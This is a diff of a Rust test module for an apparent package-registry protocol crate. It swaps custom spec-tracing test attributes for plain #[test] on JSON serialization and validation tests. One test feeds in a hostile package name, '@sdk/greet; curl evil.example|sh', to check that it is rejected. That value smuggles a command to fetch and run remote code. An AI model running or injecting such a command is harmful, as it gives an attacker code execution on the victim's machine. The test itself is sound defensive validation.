@@ -305,10 +305,7 @@ mod tests {
         assert_eq!(&serde_json::from_value::<T>(expected).unwrap(), value);
     }
 
-    #[specforge_test_macros::test(
-        type = "VersionList",
-        verify = "VersionList is the JSON a registry serves for a package's versions"
-    )]
+    #[test]
     fn a_version_list_is_this_json() {
         is_this_json(
             &VersionList {
@@ -319,10 +316,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        type = "PackageMetadata",
-        verify = "PackageMetadata is the JSON a registry serves for one version"
-    )]
+    #[test]
     fn package_metadata_is_this_json() {
         use chrono::TimeZone;
         let signature = PackageSignature::sign(
@@ -393,10 +387,7 @@ mod tests {
         assert!(minimal.keywords.is_empty() && minimal.manifest.is_empty());
     }
 
-    #[specforge_test_macros::test(
-        type = "SearchResults",
-        verify = "SearchResults is the JSON a registry answers a search with"
-    )]
+    #[test]
     fn search_results_are_this_json() {
         is_this_json(
             &SearchResults {
@@ -410,10 +401,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        type = "SearchHit",
-        verify = "SearchHit is the JSON of one search hit"
-    )]
+    #[test]
     fn a_search_hit_is_this_json() {
         is_this_json(
             &SearchHit {
@@ -429,10 +417,7 @@ mod tests {
         assert_eq!(bare.description, "");
     }
 
-    #[specforge_test_macros::test(
-        type = "SearchHit",
-        verify = "a search hit whose name is no package name or whose version is no SemVer version does not read"
-    )]
+    #[test]
     fn a_search_hit_is_a_package_name_and_a_version() {
         let hostile = json!({"name": "@sdk/greet; curl evil.example|sh", "version": "9.9.9"});
         assert!(serde_json::from_value::<SearchHit>(hostile.clone()).is_err());
@@ -444,10 +429,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        type = "PublishReceipt",
-        verify = "PublishReceipt is the JSON a registry answers a publish with"
-    )]
+    #[test]
     fn a_publish_receipt_is_this_json() {
         is_this_json(
             &PublishReceipt {
@@ -461,10 +443,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        type = "TokenVerified",
-        verify = "TokenVerified is the JSON a registry answers a token check with"
-    )]
+    #[test]
     fn a_token_verification_is_this_json() {
         is_this_json(
             &TokenVerified {
@@ -477,10 +456,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        type = "RegistryErrorBody",
-        verify = "RegistryErrorBody is the JSON of every registry error"
-    )]
+    #[test]
     fn an_error_body_is_this_json() {
         is_this_json(
             &ErrorBody::new(ErrorCode::NotFound, "package not found"),
@@ -564,10 +540,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        type = "SearchQuery",
-        verify = "SearchQuery is the query string a registry search reads"
-    )]
+    #[test]
     fn a_search_query_names_its_category() {
         use specforge_protocol_types::DeclaredCategory;
         assert_eq!(
@@ -591,10 +564,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        type = "PackageMetadata",
-        verify = "a package reply whose name is no package name, whose version is no SemVer version or whose sha256 is not 64 lowercase hex characters does not read"
-    )]
+    #[test]
     fn a_package_reply_holds_a_package_name_a_semver_version_and_a_lowercase_sha256() {
         let digest = "ab".repeat(32);
         let reply = |key: &str, value: serde_json::Value| {
@@ -619,10 +589,7 @@ mod tests {
         assert!(serde_json::from_value::<PackageMetadata>(reply("size_bytes", json!(1))).is_ok());
     }
 
-    #[specforge_test_macros::test(
-        type = "PackageMetadata",
-        verify = "a package reply read as values writes the text it was read from"
-    )]
+    #[test]
     fn a_reply_read_as_values_writes_the_text_it_was_read_from() {
         let digest = "ab".repeat(32);
         for (name, version) in [
@@ -640,10 +607,7 @@ mod tests {
         }
     }
 
-    #[specforge_test_macros::test(
-        type = "VersionList",
-        verify = "a version list holding a version that is no SemVer version does not read"
-    )]
+    #[test]
     fn a_version_list_holds_semver_versions() {
         for bad in [
             json!({"name": "@acme/tool", "versions": ["1.0.0", "not-a-version"]}),
@@ -658,10 +622,7 @@ mod tests {
         assert!(serde_json::from_value::<VersionList>(good).is_ok());
     }
 
-    #[specforge_test_macros::test(
-        type = "TokenVerified",
-        verify = "a token check whose expires_at is not an RFC 3339 timestamp does not read"
-    )]
+    #[test]
     fn a_token_expiry_is_an_rfc_3339_timestamp() {
         let check = |expires_at: serde_json::Value| {
             serde_json::from_value::<TokenVerified>(
